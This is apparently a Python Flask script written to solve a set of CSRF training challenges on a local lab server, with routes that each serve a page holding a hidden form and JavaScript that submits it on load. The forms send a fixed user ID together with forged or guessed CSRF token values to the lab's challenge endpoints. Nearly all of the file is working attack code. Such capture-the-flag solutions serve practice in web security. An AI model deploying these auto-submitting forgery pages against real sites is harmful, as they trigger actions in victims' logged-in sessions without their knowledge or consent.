#!/usr/bin/env python
from flask import Flask
import os

app = Flask(__name__)

# Settings
URL='https://localhost:8080'
PORT=1337
USERID='ee2271cbd07391ed5814e678c502e5710d8f01be'
CSRFTOKEN='94622220256359250488421096803146090687'

# Get address of hostname 
ADDRESS=os.popen("hostname -I |awk '{print $1}'").read().strip()
ROUTES=['/csrf2','/csrf3','/csrf4','/csrf5','/csrfjson']

# List addresses to post
def list_addresses():

   print "Use these addresses\n"
   for route in ROUTES:
	print "http://%s:%s%s" % (ADDRESS, PORT, route)
   print "\n"


@app.route('/')
def index():
    html = """
<html>
<body bgcolor='black' text='#7FFF00'>
<pre>Simple CSRF Service to complete """ + URL + """/login.jsp CSRF challenges. //mikkal </pre>
</body>
</html>
"""
    return html

@app.route('/csrf2')
def csrf2():

    html= """
<html>
<body bgcolor='black' text='#7FFF00'>
<pre>Thanks you gave me the flag! //mikkal </pre>
<br/><br/>
<form id="csrf2" action=""" + unichr(34) + URL + """/user/csrfchallengetwo/plusplus" method="POST" >
<input type="hidden" name="userId" value=""" + unichr(34) + USERID + unichr(34) + """ />
<input type="submit"/>
</form>
<script>
document.forms["csrf2"].submit();
</script>
</body>
</html>
<br/><br/>
"""
    return html

@app.route('/csrf3')
def csrf3():

    html= """
<html>
<body bgcolor='black' text='#7FFF00'>
<pre>Thanks you gave me the flag! //mikkal </pre>
<br/><br/>
<form id="csrf3" action=""" + unichr(34) + URL + """/user/csrfchallengethree/plusplus" method="POST" >
<input type="hidden" name="userid" value="""+ unichr(34) + USERID + unichr(34) + """ />
<input type="hidden" name="csrfToken" value="b0rk" />
<input type="submit"/>
</form>
<script>
document.forms["csrf3"].submit();
</script>
</body>
</html>
"""
    return html


@app.route('/csrf4')
def csrf4():

    html= """
<html>
<body bgcolor='black' text='#7FFF00'>
<pre>Thanks you gave me the flag! //mikkal </pre>
<br/><br/>
<form id="csrf4" action=""" + unichr(34) + URL + """/user/csrfchallengefour/plusplus" method="POST" >
<input type="hidden" name="userId" value=""" + unichr(34) + USERID + unichr(34) + """ />
<input type="hidden" name="csrfToken" value=""" + CSRFTOKEN +""" />
<input type="submit"/>
</form>
<script>
document.forms["csrf4"].submit();
</script>
</body>
</html>
"""
    return html

@app.route('/csrf5')
def csrf5():

    html= """
<html>
<body bgcolor='black' text='#7FFF00'>
<pre>Thanks you gave me the flag! //mikkal </pre>
<br/><br/>
<form id="csrf5" action=""" + unichr(34) + URL + """/user/csrfchallengefive/plusplus" method="POST" >
<input type="hidden" name="userId" value=""" + unichr(34) + USERID + unichr(34) + """ />
<input type="hidden" name="csrfToken" value="1" />
<input type="submit"/>
</form>
<script>
document.forms["csrf5"].submit();
</script>
</body>
</html>
"""
    return html

@app.route('/csrfjson')
def csrfjson():

    html= """
<html>
<body bgcolor='black' text='#7FFF00'>
<pre>Thanks you gave me the flag! //mikkal </pre>
<br/><br/>
<form id="csrfjson" action=""" + unichr(34) + URL + """/user/csrfchallengejson/plusplus" method="POST" >
<input type="hidden" name="userId" value="{\"userId\":""" + unichr(34) + USERID + unichr(34) + """}"> 
<input type="submit"/>
</form>
<script>
document.forms["csrfjson"].submit();
</script>
</body>
</html>
"""
    return html

if __name__ == '__main__':
    list_addresses()
    app.run(host= '0.0.0.0', port=PORT)
